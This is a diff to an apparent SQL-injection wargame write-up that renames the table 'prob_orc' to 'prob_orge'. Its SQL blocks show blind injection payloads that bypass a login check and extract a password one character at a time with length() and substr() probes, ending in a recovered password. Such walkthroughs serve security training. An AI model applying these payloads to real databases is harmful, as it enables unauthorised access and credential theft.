@@ -36,10 +36,10 @@ If we provide the following URI:
 The resultant query becomes:
 
 ```sql
-SELECT id FROM prob_orc WHERE id='admin' || pw='' && length(pw)=1 -- -'
+SELECT id FROM prob_orge WHERE id='admin' || pw='' && length(pw)=1 -- -'
 
 ## Queried part:
-SELECT id FROM prob_orc WHERE id='admin' || pw='' && length(pw)=1
+SELECT id FROM prob_orge WHERE id='admin' || pw='' && length(pw)=1
 
 ## Commented part:
 '
@@ -60,10 +60,10 @@ If we keep increasing the length and provide the following URI:
 The resultant query becomes:
 
 ```sql
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' || id='admin' && length(pw)=8 -- -''
+SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && length(pw)=8 -- -''
 
 ## Queried part:
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' || id='admin' && length(pw)=8
+SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && length(pw)=8
 
 ## Commented part:
 '
@@ -92,10 +92,10 @@ If we provide the following URI:
 The resultant query becomes:
 
 ```sql
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' || id='admin' && substr(pw, 1, 1)='0' -- -'
+SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && substr(pw, 1, 1)='0' -- -'
 
 ## Queried part:
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' || id='admin' && substr(pw, 1, 1)='0'
+SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && substr(pw, 1, 1)='0'
 
 ## Commented part:
 '
@@ -116,10 +116,10 @@ We can try other characters moving up to the following:
 The resultant query becomes:
 
 ```sql
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' || id='admin' && substr(pw, 1, 1)='7' -- -'
+SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && substr(pw, 1, 1)='7' -- -'
 
 ## Queried part:
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' || id='admin' && substr(pw, 1, 1)='7'
+SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && substr(pw, 1, 1)='7'
 
 ## Commented part:
 '
@@ -140,10 +140,10 @@ We can move onto the next characters:
 The resultant query becomes:
 
 ```sql
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' || id='admin' && substr(pw, 2, 1)='0' -- -'
+SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && substr(pw, 2, 1)='0' -- -'
 
 ## Queried part:
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' || id='admin' && substr(pw, 2, 1)='0'
+SELECT id FROM prob_orge WHERE id='admin' AND pw='' || id='admin' && substr(pw, 2, 1)='0'
 
 ## Commented part:
 '
@@ -170,7 +170,7 @@ Now, we can provide password URI:
 The resultant query becomes:
 
 ```sql
-SELECT id FROM prob_orc WHERE id='admin' AND pw='7b751aec'
+SELECT id FROM prob_orge WHERE id='admin' AND pw='7b751aec'
 ```
 
 
